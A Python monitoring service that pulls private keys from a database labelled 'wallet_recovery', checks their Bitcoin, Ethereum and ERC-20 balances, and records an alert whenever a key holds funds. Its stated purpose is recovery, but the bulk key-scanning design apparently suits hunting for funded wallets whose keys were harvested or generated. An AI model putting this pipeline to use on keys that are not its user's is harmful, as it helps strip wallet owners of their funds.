#!/usr/bin/env python3
"""
Unified Wallet Monitoring Service
=================================
Production-grade monitoring service that:
- Monitors database for new keys and checks balances
- Performs periodic re-checks of existing keys
- Integrates multi-chain and ERC-20 checking
- Provides real-time alerts and notifications
"""

import os
import sys
import time
import json
import logging
import asyncio
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
from typing import Dict, List, Any, Optional

# Environment setup
os.environ.setdefault('DB_HOST', 'localhost')
os.environ.setdefault('DB_PORT', '5432')
os.environ.setdefault('DB_NAME', 'wallet_recovery')

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - MONITOR - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('monitoring.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class MonitorConfig:
    """Monitoring configuration"""
    new_keys_check_interval: int = 300  # 5 minutes
    balance_recheck_interval: int = 3600  # 1 hour
    batch_size: int = 50
    max_concurrent_checks: int = 10

class UnifiedWalletMonitor:
    """Unified monitoring service"""
    
    def __init__(self, config: Optional[MonitorConfig] = None):
        self.config = config or MonitorConfig()
        self.running = False
        self.last_key_check = datetime.now()
        self.last_balance_check = datetime.now()
        
        # Initialize components
        try:
            from database_integration import DatabaseIntegratedScanner
            from erc20_checker import ERC20TokenChecker
            from multichain_checker import MultiChainWalletChecker
            
            self.db_scanner = DatabaseIntegratedScanner()
            self.erc20_checker = ERC20TokenChecker()
            self.multichain_checker = MultiChainWalletChecker()
            logger.info("✅ Monitor components initialized")
        except Exception as e:
            logger.error(f"❌ Failed to initialize components: {e}")
    
    async def check_new_keys(self):
        """Check for new keys in database and scan their balances"""
        try:
            with self.db_scanner.db_service.db_manager.engine.connect() as conn:
                from sqlalchemy import text
                query = text("""
                    SELECT id, key_hex FROM private_keys 
                    WHERE last_balance_check IS NULL 
                    ORDER BY created_at DESC 
                    LIMIT :batch_size
                """)
                result = conn.execute(query, {"batch_size": self.config.batch_size})
                new_keys = result.fetchall()
            
            if new_keys:
                logger.info(f"🔍 Found {len(new_keys)} new keys to check")
                for key_id, key_hex in new_keys:
                    await self.check_key_balance(key_id, key_hex)
            
            self.last_key_check = datetime.now()
        except Exception as e:
            logger.error(f"❌ Error checking new keys: {e}")
    
    async def check_key_balance(self, key_id: int, key_hex: str):
        """Check balance for a specific key across all supported chains"""
        try:
            # Multi-chain balance check
            btc_balance = self.multichain_checker.check_bitcoin_balance(key_hex)
            eth_balance = self.multichain_checker.check_ethereum_balance(key_hex)
            erc20_tokens = self.erc20_checker.check_erc20_balances(key_hex)
            
            # Update database with results
            total_value = (btc_balance.get('balance_usd', 0) + 
                          eth_balance.get('balance_usd', 0) + 
                          sum(token.get('balance_usd', 0) for token in erc20_tokens.get('tokens', [])))
            
            if total_value > 0:
                logger.info(f"💰 FUNDED KEY FOUND! Key {key_id}: ${total_value:.2f}")
                await self.send_alert(key_id, key_hex, total_value)
            
            # Update last check time
            with self.db_scanner.db_service.db_manager.engine.connect() as conn:
                from sqlalchemy import text
                update_query = text("""
                    UPDATE private_keys 
                    SET last_balance_check = :check_time, total_balance_usd = :balance
                    WHERE id = :key_id
                """)
                conn.execute(update_query, {
                    "check_time": datetime.now(),
                    "balance": total_value,
                    "key_id": key_id
                })
                conn.commit()
                
        except Exception as e:
            logger.error(f"❌ Error checking key {key_id}: {e}")
    
    async def send_alert(self, key_id: int, key_hex: str, total_value: float):
        """Send alert for funded wallet"""
        alert_data = {
            'timestamp': datetime.now().isoformat(),
            'key_id': key_id,
            'key_hex': key_hex[:10] + '...',  # Partial key for security
            'total_value_usd': total_value,
            'alert_type': 'FUNDED_WALLET_FOUND'
        }
        
        # Save to alerts file
        alerts_file = 'wallet_alerts.json'
        alerts = []
        if os.path.exists(alerts_file):
            with open(alerts_file, 'r') as f:
                alerts = json.load(f)
        
        alerts.append(alert_data)
        with open(alerts_file, 'w') as f:
            json.dump(alerts, f, indent=2)
        
        logger.info(f"🚨 ALERT SAVED: Funded wallet found - ${total_value:.2f}")
    
    async def run_monitoring_cycle(self):
        """Run one complete monitoring cycle"""
        now = datetime.now()
        
        # Check for new keys
        if (now - self.last_key_check).seconds >= self.config.new_keys_check_interval:
            await self.check_new_keys()
        
        # Periodic balance re-check (for existing keys)
        if (now - self.last_balance_check).seconds >= self.config.balance_recheck_interval:
            await self.periodic_balance_recheck()
    
    async def periodic_balance_recheck(self):
        """Periodically re-check balances of existing keys"""
        try:
            with self.db_scanner.db_service.db_manager.engine.connect() as conn:
                from sqlalchemy import text
                query = text("""
                    SELECT id, key_hex FROM private_keys 
                    WHERE last_balance_check < :cutoff_time
                    ORDER BY last_balance_check ASC 
                    LIMIT :batch_size
                """)
                cutoff = datetime.now() - timedelta(hours=24)  # Re-check daily
                result = conn.execute(query, {
                    "cutoff_time": cutoff,
                    "batch_size": self.config.batch_size
                })
                old_keys = result.fetchall()
            
            if old_keys:
                logger.info(f"🔄 Re-checking {len(old_keys)} keys for balance updates")
                for key_id, key_hex in old_keys:
                    await self.check_key_balance(key_id, key_hex)
            
            self.last_balance_check = datetime.now()
        except Exception as e:
            logger.error(f"❌ Error in periodic recheck: {e}")
    
    async def start_monitoring(self):
        """Start the monitoring service"""
        self.running = True
        logger.info("🚀 Unified Wallet Monitor Starting...")
        
        while self.running:
            try:
                await self.run_monitoring_cycle()
                await asyncio.sleep(60)  # Check every minute
            except KeyboardInterrupt:
                logger.info("⏹️  Monitoring stopped by user")
                self.running = False
            except Exception as e:
                logger.error(f"❌ Monitor error: {e}")
                await asyncio.sleep(60)
        
        logger.info("🏁 Unified Wallet Monitor Stopped")

async def main():
    """Main entry point"""
    config = MonitorConfig()
    monitor = UnifiedWalletMonitor(config)
    await monitor.start_monitoring()

if __name__ == "__main__":
    asyncio.run(main())
